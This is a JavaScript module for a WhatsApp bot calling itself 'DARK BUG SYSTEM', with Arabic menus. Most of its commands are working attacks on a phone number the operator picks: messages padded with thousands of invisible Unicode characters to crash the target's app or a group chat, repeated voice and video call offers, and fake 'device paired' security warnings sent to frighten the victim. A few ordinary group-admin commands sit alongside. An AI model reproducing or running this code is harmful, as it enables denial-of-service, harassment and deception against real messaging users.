const formatNumber = (input) => {
  let num = input.replace(/\D/g, '');
  if (num.startsWith('0')) num = '2' + num;
  if (!num.startsWith('2')) num = '2' + num;
  return '+' + num;
};

const delay = (ms) => new Promise(res => setTimeout(res, ms));

const sendCrashNotification = async (sock, m, from, cmd, target, title = 'تم تنفيذ العملية بنجاح', desc = 'تم إرسال الكراش/السبام بنجاح') => {
  const formattedTarget = formatNumber(target);
  const sender = m.key?.participant || m.key?.remoteJid || 'غير معروف';

  const message = `
┌──────┤ NOTIFICATION ├──────┐
│ ✅ ${title}
│ 🎯 Target: ${formattedTarget}
│ 👤 From: ${sender}
└────────────────────────┘`;

  await sock.sendMessage(from, {
    text: message,
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true,
      externalAdReply: {
        title: "☯︎ DARK BUG SYSTEM ☯︎",
        body: desc,
        thumbnailUrl: "https://telegra.ph/file/5f994ed3e763ec1c8a9cf.jpg",
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true,
        sourceUrl: "https://whatsapp.com/channel/0029VbApA5g6LwHf2RgRYH0D"
      }
    }
  }, { quoted: m });
};

export const handleDeadCrashMenu = async (sock, m, from, cmd, args, isGroup, groupMetadata, owners, premiums) => {
  if (cmd === '.قائمة3') {
    const list = `𓆩 𓊈☯︎ قائمة أوامر DARK BUG ☯︎𓊉 𓆪

⟬ 𝑩𝑼𝑮 𝑴𝑬𝑵𝑼 ⚙️ ⟭
➥ 🧿 .xdark
➥ 🧿 .xdark2
➥ 🧿 .xdark-group
➥ 🧿 .invis-hard
➥ 🧿 .invis-delay
➥ 🧿 .invis-slow
➥ 🧿 .invis-bulldozer
➥ 🧿 .spamcall [رقم]
➥ 🧿 .spamvidcall [رقم]
➥ 🧿 .spampair [رقم]

⟬ 𝑶𝑾𝑵𝑬𝑹 𝑴𝑬𝑵𝑼 👑 ⟭
➥ 🛡️ .addown [رقم]
➥ 🛡️ .addprem [رقم]
➥ 🛡️ .delown [رقم]
➥ 🛡️ .delprem [رقم]
➥ 🛡️ .self
➥ 🛡️ .public

⟬ 𝑮𝑹𝑶𝑼𝑷 𝑴𝑬𝑵𝑼 💠 ⟭
➥ 👥 .hidetag
➥ 👥 .kick [رقم]
➥ 👥 .linkgroup`;

    return await sock.sendMessage(from, {
      text: list,
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          title: "☯︎ DARK BUG SYSTEM ☯︎",
          body: "☢️ قائمة التدمير والاختراق",
          thumbnailUrl: "https://telegra.ph/file/5f994ed3e763ec1c8a9cf.jpg",
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true,
          sourceUrl: "https://whatsapp.com/channel/0029VbApA5g6LwHf2RgRYH0D"
        }
      }
    }, { quoted: m });
  }

  if (cmd === '.xdark') {
    if (!args[1]) return await sock.sendMessage(from, { text: '📌 اكتب رقم الهدف بعد الأمر:\nمثال: .xdark 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    const invisibleCrash = "\u2063".repeat(3000);
    await sock.sendMessage(jid, { text: invisibleCrash });
    await sendCrashNotification(sock, m, from, cmd, target, 'كراش مخفي تم إرساله', 'تم إرسال كراش غير مرئي إلى الهدف بنجاح');
  }

  if (cmd === '.xdark2') {
    if (!args[1]) return await sock.sendMessage(from, { text: '📌 اكتب رقم الهدف بعد الأمر:\nمثال: .xdark2 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    const visibleCrash = `𓆩 𝗗𝗔𝗥𝗞 𝗖𝗥𝗔𝗦𝗛 ☠︎𓆪

╭━━━━━━❖
┃💥 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣 𝗘𝗥𝗥𝗢𝗥 404
┃🧠 SYSTEM OVERLOAD
┃🚫 DEVICE STUCKED
╰━━━━━━❖

██▓▒░░ كراش دارك ░░▒▓██`;
    await sock.sendMessage(jid, { text: visibleCrash });
    await sendCrashNotification(sock, m, from, cmd, target, 'تم إرسال كراش ظاهر', 'تم تنفيذ كراش ظاهر قد يسبب انتحار التطبيق');
  }

  if (cmd === '.xdark-group') {
    if (!from.endsWith('@g.us')) return await sock.sendMessage(from, { text: '📛 هذا الأمر يعمل فقط داخل الجروبات.' }, { quoted: m });
    const groupBomb = "\u2063".repeat(5000);
    for (let i = 0; i < 10; i++) {
      await sock.sendMessage(from, { text: groupBomb });
    }
    await sendCrashNotification(sock, m, from, cmd, 'Group', 'تم تفجير الجروب بنجاح', '🔻تم إرسال كراش جماعي');
  }

  if (cmd === '.invis-hard') {
    if (!args[1]) return await sock.sendMessage(from, { text: '📌 اكتب رقم الهدف:\nمثال: .invis-hard 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    const payload = "\u2063".repeat(3000) + "\u200F".repeat(2000);
    for (let i = 0; i < 3; i++) await sock.sendMessage(jid, { text: payload });
    await sendCrashNotification(sock, m, from, cmd, target, 'تم تنفيذ كراش صيني', '🔻تم إرسال كراش متطور للهدف');
  }

  if (cmd === '.invis-delay') {
    if (!args[1]) return await sock.sendMessage(from, { text: '📌 اكتب رقم الهدف:\nمثال: .invis-delay 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    const slowCrash = "\u2063".repeat(2500) + "\u200E".repeat(1000);
    for (let i = 0; i < 5; i++) {
      await delay(2000);
      await sock.sendMessage(jid, { text: slowCrash });
    }
    await sendCrashNotification(sock, m, from, cmd, target, 'تم تنفيذ كراش بتأخير قاتل', '📤 تم الإرسال بالتدريج');
  }

  if (cmd === '.invis-slow') {
    if (!args[1]) return await sock.sendMessage(from, { text: '📌 اكتب رقم الهدف:\nمثال: .invis-slow 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    const payload = "\u200F".repeat(3500);
    await sock.sendMessage(jid, { text: payload });
    await sendCrashNotification(sock, m, from, cmd, target, 'كراش بطيء تم تنفيذه', '⏳ كراش بطيء ومؤثر');
  }

  if (cmd === '.invis-bulldozer') {
    if (!args[1]) return await sock.sendMessage(from, { text: '📌 اكتب رقم الهدف:\nمثال: .invis-bulldozer 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    for (let i = 0; i < 10; i++) {
      const blast = "\u2063".repeat(1000) + "\u200B".repeat(1000);
      await sock.sendMessage(jid, { text: blast });
    }
    await sendCrashNotification(sock, m, from, cmd, target, '🚜 الجرافة اشتغلت', 'كراش Bulldozer تم');
  }

  if (cmd === '.spamcall') {
    if (!args[1]) return await sock.sendMessage(from, { text: '📞 اكتب رقم الهدف:\nمثال: .spamcall 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    for (let i = 0; i < 5; i++) {
      await sock.ws.send(JSON.stringify({
        tag: 'call',
        attrs: {
          from: sock.user.id,
          to: jid,
          id: `${Math.floor(Math.random() * 1e5)}`
        },
        content: [{ tag: 'offer', attrs: {}, content: [] }]
      }));
      await delay(1000);
    }
    await sendCrashNotification(sock, m, from, cmd, target, '📞 سبام مكالمات', 'تم إرسال مكالمات متتالية');
  }

  if (cmd === '.spamvidcall') {
    if (!args[1]) return await sock.sendMessage(from, { text: '🎥 اكتب رقم الهدف:\nمثال: .spamvidcall 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    for (let i = 0; i < 3; i++) {
      await sock.ws.send(JSON.stringify({
        tag: 'call',
        attrs: {
          from: sock.user.id,
          to: jid,
          id: `${Math.floor(Math.random() * 1e6)}`
        },
        content: [{ tag: 'video', attrs: {}, content: [] }]
      }));
      await delay(1500);
    }
    await sendCrashNotification(sock, m, from, cmd, target, '🎥 مكالمات فيديو سبام', 'تم تنفيذ فيديو كول متكرر');
  }

  if (cmd === '.spampair') {
    if (!args[1]) return await sock.sendMessage(from, { text: '🔗 اكتب رقم الهدف:\nمثال: .spampair 201000000000' }, { quoted: m });
    const target = args[1];
    const jid = `${formatNumber(target)}@s.whatsapp.net`;
    for (let i = 0; i < 10; i++) {
      await sock.sendMessage(jid, { text: '⛓️ تم ربط جهازك بجهاز آخر بنجاح.\nإذا لم تكن أنت، يرجى مراجعة الأمان.' });
      await delay(1000);
    }
    await sendCrashNotification(sock, m, from, cmd, target, '📡 ربط وهمي', 'تم إرسال روابط وهمية لربط الجهاز');
  }
  if (cmd === '.addown') {
    if (!args[1]) return await sock.sendMessage(from, { text: '👑 اكتب رقم الشخص:\nمثال: .addown 201000000000' }, { quoted: m });
    const number = formatNumber(args[1]);
    if (!owners.includes(number)) owners.push(number);
    await sock.sendMessage(from, { text: `✅ تم إضافة ${number} إلى قائمة المالكين.` }, { quoted: m });
  }

  if (cmd === '.addprem') {
    if (!args[1]) return await sock.sendMessage(from, { text: '🌟 اكتب رقم الشخص:\nمثال: .addprem 201000000000' }, { quoted: m });
    const number = formatNumber(args[1]);
    if (!premiums.includes(number)) premiums.push(number);
    await sock.sendMessage(from, { text: `✅ تم إضافة ${number} إلى قائمة المميزين.` }, { quoted: m });
  }

  if (cmd === '.delown') {
    if (!args[1]) return await sock.sendMessage(from, { text: '❌ اكتب رقم الشخص:\nمثال: .delown 201000000000' }, { quoted: m });
    const number = formatNumber(args[1]);
    const index = owners.indexOf(number);
    if (index > -1) {
      owners.splice(index, 1);
      await sock.sendMessage(from, { text: `🚫 تم حذف ${number} من قائمة المالكين.` }, { quoted: m });
    } else {
      await sock.sendMessage(from, { text: `⚠️ الرقم ${number} غير موجود ضمن المالكين.` }, { quoted: m });
    }
  }

  if (cmd === '.delprem') {
    if (!args[1]) return await sock.sendMessage(from, { text: '❌ اكتب رقم الشخص:\nمثال: .delprem 201000000000' }, { quoted: m });
    const number = formatNumber(args[1]);
    const index = premiums.indexOf(number);
    if (index > -1) {
      premiums.splice(index, 1);
      await sock.sendMessage(from, { text: `🚫 تم حذف ${number} من قائمة المميزين.` }, { quoted: m });
    } else {
      await sock.sendMessage(from, { text: `⚠️ الرقم ${number} غير موجود ضمن المميزين.` }, { quoted: m });
    }
  }

  if (cmd === '.self') {
    global.mode = 'self';
    await sock.sendMessage(from, { text: '🔒 تم تفعيل الوضع الفردي. البوت يرد فقط على المالك.' }, { quoted: m });
  }

  if (cmd === '.public') {
    global.mode = 'public';
    await sock.sendMessage(from, { text: '🌍 تم تفعيل الوضع العام. يمكن للجميع استخدام البوت.' }, { quoted: m });
  }

  if (cmd === '.hidetag') {
    if (!isGroup) return await sock.sendMessage(from, { text: '❌ هذا الأمر للجروبات فقط.' }, { quoted: m });
    const participants = groupMetadata.participants.map(p => p.id);
    const text = args.slice(1).join(' ') || '📢 تنبيه لجميع الأعضاء';

    await sock.sendMessage(from, {
      text,
      mentions: participants,
      contextInfo: {
        externalAdReply: {
          title: "🔊 HIDE TAG",
          body: "رسالة عامة دون إزعاج",
          thumbnailUrl: "https://telegra.ph/file/5f994ed3e763ec1c8a9cf.jpg",
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true,
          sourceUrl: "https://whatsapp.com/channel/0029VbApA5g6LwHf2RgRYH0D"
        }
      }
    }, { quoted: m });
  }

  if (cmd === '.kick') {
    if (!isGroup) return await sock.sendMessage(from, { text: '❌ هذا الأمر يعمل داخل الجروبات فقط.' }, { quoted: m });
    if (!args[1]) return await sock.sendMessage(from, { text: '❌ اكتب الرقم:\nمثال: .kick 201000000000' }, { quoted: m });

    const number = formatNumber(args[1]);
    await sock.groupParticipantsUpdate(from, [`${number}@s.whatsapp.net`], 'remove');

    await sock.sendMessage(from, {
      text: `┌──────┤ NOTIFICATION ├──────┐
  │ Sent KICK...
  │ Target: ${number}
  │ From: ${m.key.participant?.split('@')[0] || 'غير معروف'}
  └────────────────────────┘`,
      contextInfo: {
        externalAdReply: {
          title: "🚷 طرد عضو",
          body: "تم تنفيذ الأمر",
          thumbnailUrl: "https://telegra.ph/file/5f994ed3e763ec1c8a9cf.jpg",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://whatsapp.com/channel/0029VbApA5g6LwHf2RgRYH0D"
        }
      }
    }, { quoted: m });
  }

  if (cmd === '.linkgroup') {
    if (!isGroup) return await sock.sendMessage(from, { text: '❌ هذا الأمر متاح فقط داخل الجروبات.' }, { quoted: m });
    const code = await sock.groupInviteCode(from);
    await sock.sendMessage(from, {
      text: `🔗 رابط الجروب:\nhttps://chat.whatsapp.com/${code}`,
      contextInfo: {
        externalAdReply: {
          title: "🔗 LINK GROUP",
          body: "رابط دعوة جديد",
          thumbnailUrl: "https://telegra.ph/file/5f994ed3e763ec1c8a9cf.jpg",
          mediaType: 1,
          renderLargerThumbnail: true,
          showAdAttribution: true,
          sourceUrl: "https://whatsapp.com/channel/0029VbApA5g6LwHf2RgRYH0D"
        }
      }
    }, { quoted: m });
  }
  };